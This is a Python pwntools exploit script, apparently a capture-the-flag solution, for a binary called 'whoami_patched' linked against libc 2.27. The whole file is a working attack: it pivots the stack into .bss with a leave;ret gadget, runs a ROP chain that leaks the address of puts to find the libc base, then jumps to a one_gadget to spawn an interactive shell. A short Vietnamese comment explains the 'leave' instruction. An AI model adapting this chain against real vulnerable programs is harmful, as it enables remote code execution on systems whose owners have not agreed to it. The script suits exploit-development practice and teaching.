from pwn import *
from ctypes import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-peda
b* 0x4007cc
b* 0x4007d7
b* puts + 352
continue
'''.format(**locals())

#Binary filename
exe = './whoami_patched'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

################################################################

p = start()
libc = ELF("./libc-2.27.so")

'''
bài này tập trung đoạn leave hiểu là mov rsp, rbp; pop rbp 
'''

bss = 0x601040
pop_rdi = 0x400843
leave_ret = 0x4007d6
pop_rsi_r15 = 0x400841
pop_rbx = 0x40083a
mov_rdx_r15 = 0x400820

p.recvuntil(b"Input name:\n")
payload = b"a" * 0x20 + p64(0x601040 + 0x80) + p64(leave_ret)
p.send(payload)

p.recvuntil(b"Else?\n")
payload = b"\x00" * 0x88 + p64(pop_rdi)
payload += p64(elf.got.puts) + p64(elf.plt.puts)
payload += p64(pop_rbx) + p64(0) + p64(1)
payload += p64(elf.got.read) + p64(0) + p64(bss) + p64(0x150)
payload += p64(mov_rdx_r15) 
p.sendline(payload)

leak = u64(p.recv(6).ljust(8, b"\x00"))
print(hex(leak))
libc.address = leak - libc.sym['puts']
print(hex(libc.address))
one_gadget = libc.address + 0x4f3c2

payload = b"c" * 0xd8
payload += p64(one_gadget)
p.sendline(payload)

p.interactive()        


